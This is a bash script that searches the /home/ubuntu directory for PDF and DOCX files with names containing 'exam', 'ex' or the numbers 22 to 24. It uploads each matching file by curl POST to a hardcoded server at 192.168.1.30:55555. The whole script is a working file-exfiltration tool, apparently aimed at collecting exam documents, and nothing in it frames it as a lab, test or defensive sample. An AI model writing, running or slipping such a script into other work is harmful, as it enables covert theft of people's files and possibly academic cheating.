#!/bin/bash

# Search directory in the Ubuntu home directory
SEARCH_DIR="/home/ubuntu"

# Flask server URL
SERVER_URL="http://192.168.1.30:55555/upload_file"

# File search and upload
find "$SEARCH_DIR" -type f \( \
    -iname "*exam*.pdf" -o \
    -iname "*exam*.docx" -o \
    -iname "*ex*.pdf" -o \
    -iname "*ex*.docx" -o \
    -iname "*22*.pdf" -o \
    -iname "*22*.docx" -o \
    -iname "*23*.pdf" -o \
    -iname "*23*.docx" -o \
    -iname "*24*.pdf" -o \
    -iname "*24*.docx" \
    \) 2>/dev/null -print0 | while IFS= read -r -d $'\0' file; do
    echo "Uploading file: $file"
    curl -X POST -H "content-type: multipart/form-data" -F "file=@$file" "$SERVER_URL"
done

echo "Process completed."


